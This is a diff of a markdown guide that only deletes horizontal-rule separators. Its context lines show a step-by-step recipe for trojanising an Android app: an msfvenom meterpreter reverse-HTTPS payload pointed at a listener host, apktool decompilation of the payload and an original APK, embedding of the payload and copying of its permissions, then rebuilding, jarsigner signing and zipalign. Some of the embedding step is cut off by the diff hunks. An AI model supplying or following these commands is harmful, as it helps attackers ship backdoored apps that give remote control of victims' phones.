@@ -6,7 +6,7 @@
 msfvenom -p android/meterpreter_reverse_https LHOST=192.168.47.5 LPORT=443 -o Payload.apk
 ```
 
-***
+
 
 ### 2. Decompiling Payload.apk
 
@@ -14,7 +14,7 @@ msfvenom -p android/meterpreter_reverse_https LHOST=192.168.47.5 LPORT=443 -o Pa
 apktool d -f Payload.apk
 ```
 
-***
+
 
 ### 3. Decompiling Original Apk
 
@@ -22,7 +22,7 @@ apktool d -f Payload.apk
 apktool d -f Original.apk
 ```
 
-***
+
 
 ### 4. Embedding Payload to Original APK
 
@@ -38,7 +38,7 @@ Please note that the above is a single line of code. It is possible to confuse b
 
 Finally, copy the NON-DUPLICATE PERMISSIONS from `Payload/AndroidManifest.xml` and paste them to `Original/AndroidManifest.xml`.
 
-***
+
 
 ### 5. Recompiling the Modded APK
 
@@ -48,7 +48,7 @@ apktool b Original.apk
 
 The unsigned modified apk will be present in `Original/dist` folder.
 
-***
+
 
 ### 6. Signing the APK
 
@@ -64,7 +64,7 @@ Now, you will use `jarsigner` to sign the apk
 jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore Modded.apk 1llus10n
 ```
 
-***
+
 
 ### 7. Optimizing the APK (ZipAlign)
 
@@ -72,4 +72,3 @@ jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore Mo
 zipalign -v 4 Modded-Signed.apk Modded-Signed-Optimized.apk
 ```
 
-***
